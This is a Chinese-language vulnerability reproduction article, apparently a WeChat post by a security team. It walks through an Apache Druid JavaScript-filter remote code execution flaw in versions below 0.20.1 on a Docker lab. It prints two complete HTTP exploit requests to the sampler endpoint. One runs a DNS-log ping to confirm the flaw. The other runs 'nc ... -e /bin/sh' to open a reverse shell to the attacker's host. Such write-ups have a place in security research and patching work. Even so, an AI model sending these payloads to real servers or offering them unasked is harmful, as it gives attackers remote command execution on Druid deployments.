<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ZdALmyPTAoRNjKuP3yDoLA)

**点击蓝字**

![](https://mmbiz.qpic.cn/mmbiz_gif/4LicHRMXdTzCN26evrT4RsqTLtXuGbdV9oQBNHYEQk7MPDOkic6ARSZ7bt0ysicTvWBjg4MbSDfb28fn5PaiaqUSng/640?wx_fmt=gif)

**关注我们**

  

**_声明  
_**

本文作者：PeiQi  
本文字数：1713

阅读时长：10min

附件 / 链接：点击查看原文下载

声明：请勿用作违法用途，否则后果自负

本文属于 WgpSec 原创奖励计划，未经许可禁止转载

  

![](https://mmbiz.qpic.cn/mmbiz_gif/4LicHRMXdTzAcVbfx1nicnhANA8uic6aE3qot85t6kDZTicxSpc6OvlKNRApqdowT92Cue5tRx4gQic8PJCl8YGyHiaQ/640?wx_fmt=gif)

  

**_前言_**

  

一、

**_漏洞描述_**

Apache Druid 是用 Java 编写的面向列的开源分布式数据存储，旨在快速获取大量事件数据，并在数据之上提供低延迟查询。Apache Druid 默认情况下缺乏授权认证，攻击者可以发送特制请求，利用 Druid 服务器上进程的特权执行任意代码。Apache Druid 包括执行用户提供的 JavaScript 的功能嵌入在各种类型请求中的代码。此功能在用于高信任度环境中，默认已被禁用。但是，在 Druid 0.20.0 及更低版本中，经过身份验证的用户发送恶意请求，利用 Apache Druid 漏洞可以执行任意代码

二、

**_漏洞影响_**

Apache Druid < 0.20.1

**三、**

**_漏洞复现_**

这里使用 Docker 来搭建环境

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCRdEUkWjnADMBeY9cRyYo7kyxCqkjjPu4AxMSEYACDbB6CiatowulzibFLGAaRB7J4bibUrbvDPNhhA/640?wx_fmt=png)

Docker 下载链接: https://github.com/apache/druid/archive/druid-0.20.0.zip

下载之后进入目录 **distribution\docker**

执行命令编译 **docker-compose up -d**

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCRdEUkWjnADMBeY9cRyYo77tHZnX7m5LEibfuXUjzzuYmeNic0EDibcKhNGp1ITk3iauojJGqZ6UjXhg/640?wx_fmt=png)

访问 http://xxx.xxx.xxx.xxx:8888 正常就行了

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCRdEUkWjnADMBeY9cRyYo7m7puUxkbibEsfoCLeluL4ZsRQI0WgXt3qeH1PP6yIkteSAEZL847GSQ/640?wx_fmt=png)

漏洞原理: [https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw](https://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&mid=2247485775&idx=1&sn=ec7d02dcbda4e120e3a4fccab5ce0d4e&scene=21#wechat_redirect)

POC 请求包

```
POST /druid/indexer/v1/sampler HTTP/1.1
Host: xxx.xxx.xxx.xxx:8888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/json
Content-Length: 995
Connection: close


{"type": "index", "spec": {"ioConfig": {"type": "index", "inputSource": {"type": "inline", "data": "{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2021-2-1T14:12:24.050Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"}, "inputFormat": {"type": "json", "keepNullColumns": true\}\}, "dataSchema": {"dataSource": "sample", "timestampSpec": {"column": "timestamp", "format": "iso"}, "dimensionsSpec": {}, "transformSpec": {"transforms": [], "filter": {"type": "javascript", "dimension": "added", "function": "function(value) {java.lang.Runtime.getRuntime().exec('ping xxxxx.dnslog.cn')}", "": {"enabled": true\}\}\}\}, "type": "index", "tuningConfig": {"type": "index"\}\}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000\}\}
```

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCRdEUkWjnADMBeY9cRyYo7icY3fFkAyha8iatnm8FIicE04OeOK9TVrZs2kZc6agOIRkDyKpXrVpMxw/640?wx_fmt=png)

```
注意请求中这个位置改为你的dnslog平台地址
java.lang.Runtime.getRuntime().exec('ping -c 4 xxxxx.dnslog.cn')
```

发送请求即可命令执行

  

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCRdEUkWjnADMBeY9cRyYo7RjP7mryicpqfUg0yxyJ7KpdziaXBXZ8KGf4LzsCafudia5yjeHkNe1sgA/640?wx_fmt=png)

看了下可能大部分都是 docker 搭建，而里面大部分命令是不存在的，但是发现 docker 里面居然默认是有 NC 命令的，那我们就可以用 nc 反弹一个 shell 了

反弹 shell 请求包

```
POST /druid/indexer/v1/sampler HTTP/1.1
Host: xxx.xxx.xxx.xxx:8888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: application/json, text/plain, */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Content-Type: application/json
Content-Length: 1008
Connection: close

{"type": "index", "spec": {"ioConfig": {"type": "index", "inputSource": {"type": "inline", "data": "{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2021-2-1T14:12:24.050Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"}, "inputFormat": {"type": "json", "keepNullColumns": true\}\}, "dataSchema": {"dataSource": "sample", "timestampSpec": {"column": "timestamp", "format": "iso"}, "dimensionsSpec": {}, "transformSpec": {"transforms": [], "filter": {"type": "javascript", "dimension": "added", "function": "function(value) {java.lang.Runtime.getRuntime().exec(' nc xxx.xxx.xxx.xxx 9999 -e /bin/sh')}", "": {"enabled": true\}\}\}\}, "type": "index", "tuningConfig": {"type": "index"\}\}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000\}\}
```

发送请求包就可以得到一个交互式 shell 了

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCRdEUkWjnADMBeY9cRyYo7yeC576icHmqjWrSY7giaTrcwjJwgvxPfe5RyiblUp3pQQsfmIgJSCMBDg/640?wx_fmt=png)

  

**_扫描关注公众号回复加群_**

**_和师傅们一起讨论研究~_**

  

**长**

**按**

**关**

**注**

**WgpSec 狼组安全团队**

微信号：wgpsec

Twitter：@wgpsec

![](https://mmbiz.qpic.cn/mmbiz_jpg/4LicHRMXdTzBhAsD8IU7jiccdSHt39PeyFafMeibktnt9icyS2D2fQrTSS7wdMicbrVlkqfmic6z6cCTlZVRyDicLTrqg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/gdsKIbdQtWAicUIic1QVWzsMLB46NuRg1fbH0q4M7iam8o1oibXgDBNCpwDAmS3ibvRpRIVhHEJRmiaPS5KvACNB5WgQ/640?wx_fmt=gif)